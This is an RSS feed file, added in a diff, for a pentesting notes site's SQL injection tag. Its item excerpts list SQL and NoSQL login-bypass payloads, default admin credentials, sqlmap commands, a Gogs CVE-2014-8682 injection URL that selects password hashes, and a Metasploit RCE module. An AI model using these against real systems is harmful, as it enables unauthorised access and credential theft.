@@ -1,0 +1,61 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SQL Injection on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/tags/sql-injection/</link>
+    <description>Recent content in SQL Injection on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Thu, 14 Dec 2023 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/tags/sql-injection/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SQL Injection Cheat Sheet</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/</link>
+      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-cheat-sheet/</guid>
+      <description>Comment Syntax linkComment syntax is depending on the database used in the website.&#xA;MSDB Comments MySQL -- - (add a space after --) # /*comment*/ /*!comment*/ MSSQL -- /*comment*/ Oracle -- PostgreSQL -- /*comment*/ SQLite -- /*comment*/ Basic Injection linkFirst off, check if we can inject SQL commands into forms or URL params in the target website.&#xA;&amp;#39; OR 1=1-- &amp;#39; OR 1=1-- - &amp;#39; OR 1=1# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;# &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1-- - &amp;#39; OR &amp;#39;1&amp;#39;=&amp;#39;1# &amp;#34; OR 1=1-- &amp;#34; OR 1=1-- - &amp;#34; OR 1=1# &amp;#39;) OR 1=1-- &amp;#39;) OR 1=1-- - &amp;#39;) OR 1=1# &amp;#39;; OR 1=1-- &amp;#39;; OR 1=1-- - &amp;#39;; OR 1=1# admin or 1=1-- admin or 1=1-- - admin or 1=1# WAF Bypass linkReference: https://owasp.</description>
+    </item>
+    <item>
+      <title>Web Login Bypass</title>
+      <link>https://documentnation.github.io/docs/hdks/web/method/web-login-bypass/</link>
+      <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/method/web-login-bypass/</guid>
+      <description>Common Default Credentials linkCheck if the website has not changed credential from the default username/password.&#xA;admin:admin admin:password admin:password1 admin:password123 admin:passw0rd admin:(empty) admin:12345 administrator:password administrator:password1 administrator:password123 administrator:passw0rd administrator:(empty) administrator:12345 # phpIPAM admin:ipamadmin Admin:ipamadmin # PHPMyAdmin root:(null) root:password SQL Injections link &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1 &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1-- or true-- &amp;#39; or true-- UNION SELECT null-- &amp;#39; UNION SELECT null-- &amp;#39; UNION SELECT 1,2-- Microsoft, Oracle, PostgreSQL link &amp;#39;-- &amp;#39; or 1=1-- &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- }&amp;#34; or 1=1-- MySQL link &amp;#39;-- - &amp;#39;# &amp;#39; or 1=1# &amp;#39; or 1=1-- - &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;-- - &amp;#39; or &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;# }&amp;#34; or 1=1-- - NoSQL Injection linkReference: https://portswigger.</description>
+    </item>
+    <item>
+      <title>NoSQL Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/nosql-injection/</link>
+      <pubDate>Thu, 05 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/nosql-injection/</guid>
+      <description>Manual Injection linkSee also Web Login Bypass NoSQL Injection.&#xA;Mongo linkIf the web application uses MongDB, you might be able to fetch the user&amp;rsquo;s information.&#xA;It allows you to bypass authentication.&#xA;/?username=admin&amp;amp;password[$ne]=xyz /?username[$ne]=admin&amp;amp;role=guest /?id[$gt]=1&amp;amp;username=john Syntax&#xA;Below are the payloads to syntax injection. Don’t forget to try the URL-encoded payloads.&#xA;test||1==1 test%7C%7C1%3D%3D1 test||1==1// test%7C%7C1%3D%3D1%2F%2F test||1==1%00 test%7C%7C1%3D%3D1%2500 test||1==1\u0000 test%7C%7C1%3D%3D1%5Cu0000 test||&amp;#39;1==1 test%7C%7C%271%3D%3D1 test||&amp;#39;1&amp;#39;==&amp;#39;1&amp;#39; test%7C%7C%271%27%3D%3D%271%27 test||&amp;#39;1&amp;#39;==&amp;#39;1 test%7C%7C%271%27%3D%3D%271 test&amp;#39;||1||&amp;#39; test%27%7c%7c%31%7c%7c%27 &amp;lt;!-- Find specific fields e.g. &amp;#39;password&amp;#39; --&amp;gt; admin&amp;#39; &amp;amp;&amp;amp; this.</description>
+    </item>
+    <item>
+      <title>SQL Injection with Sqlmap</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-with-sqlmap/</link>
+      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection-with-sqlmap/</guid>
+      <description>Basic Usage link # GET request sqlmap -u &amp;#34;http://&amp;lt;target-ip&amp;gt;/?search=test&amp;#34; Using Burp Suite Request File linkWe can specify a request file which is downloaded from Burp Suite.&#xA;In Burp Suite, right-click on the HTTP request header screen, then click Save Item to download the request file. We can use it with SQLmap. Add the &amp;quot;-r&amp;quot; flag as below.&#xA;sqlmap -r request.txt In addition, we can see payloads to be tested in Burp Suite by setting the Burp proxy IP address to the --proxy flag.</description>
+    </item>
+    <item>
+      <title>SQL Injection</title>
+      <link>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection/</link>
+      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/sql-injection/</guid>
+      <description>Identify Where SQL Injection can be Performed linkThere are many places where SQLi can be performed. For example,&#xA;URL parameters POST parameters HTTP request headers (Cookie, User-Agent, etc.) Cheat Sheet linkTo see SQL injection cheat sheet, please refer to this page.</description>
+    </item>
+    <item>
+      <title>Gogs Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/version-control/git/gogs-pentesting/</link>
+      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/version-control/git/gogs-pentesting/</guid>
+      <description>SQL injection (CVE-2014-8682) link http://127.0.0.1:3000/api/v1/users/search?q=&amp;#39;)/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1-- Automation link sqlmap -u &amp;#34;https://example.com/api/v1/repos/search?q=test&amp;#34; sqlmap -u &amp;#34;https://example.com/api/v1/users/search?q=test&amp;#34; Git Hooks Remote Code Execution (RCE) link msfconsole msf&amp;gt; use exploit/multi/http/gogs_git_hooks_rce msf&amp;gt; (set options...) msf&amp;gt; run </description>
+    </item>
+    <item>
+      <title>WebSocket Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/web/websocket-pentesting/</link>
+      <pubDate>Wed, 08 Mar 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/web/websocket-pentesting/</guid>
+      <description>Connect with CLI linkwebsocat is a command-line client for WebSockets, like netcat for&#xA;websocat ws://&amp;lt;ip&amp;gt;/ Connect with Python Script link import websocket,json ws = websocket.WebSocket() ws.connect(&amp;#34;ws://10.0.0.1/&amp;#34;) d = {&amp;#34;message&amp;#34;: &amp;#34;hello&amp;#34;} data = str(json.dumps(d)) ws.send(data) result = ws.recv() print(json.loads(result)) As above, we can manipulate the data to send. For example,&#xA;{&amp;#34;message&amp;#34;: &amp;#34;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;#34;} If the website reflects the result of the above interactions, we can affect the website.&#xA;Blind SQL Injection linkFirst, create a Python script to establish a middleware server to forward sqlmap payloads to the target WebSocket server.</description>
+    </item>
+  </channel>
+</rss>
